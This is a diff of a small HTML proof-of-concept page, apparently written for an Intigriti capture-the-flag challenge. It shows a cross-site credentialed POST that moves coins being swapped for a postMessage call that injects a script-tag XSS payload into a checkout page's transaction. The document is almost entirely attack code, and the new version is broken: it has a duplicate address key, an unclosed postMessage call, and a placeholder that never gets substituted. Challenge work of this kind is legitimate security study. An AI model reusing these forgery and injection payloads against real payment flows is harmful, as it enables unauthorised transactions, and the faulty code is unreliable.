@@ -1,20 +1,14 @@
 <title>Intigriti Jan 2026 PoC</title>
 <h1>Intigriti Jan 2026 PoC</h1>
 <div></div>
-<div id='responsediv'></div>
 <script>
-const response = fetch('https://challenge-0126.intigriti.io/api/transaction', {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json'
-  },
-  credentials: 'include',
-  body: JSON.stringify({
-    toAddress: "1efa71b644e7179d950eb04e38b038ddd2",
-    currency: "1337COIN",
-    amount: "1"
-  })
-});
-const result = response.json();
-document.getElementById('responsediv').innerHTML = result;
+  var win = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1000000");
+  win.postMessage({
+        type: 'submitTransaction',
+        transaction: {
+        toAddress: "<script>alert(${FLAG})<\/script>",
+        toAddress: "1efa71b644e7179d950eb04e38b038ddd2",
+        currency: "1337COIN",
+        amount: "1.00000000"
+        }
 </script>
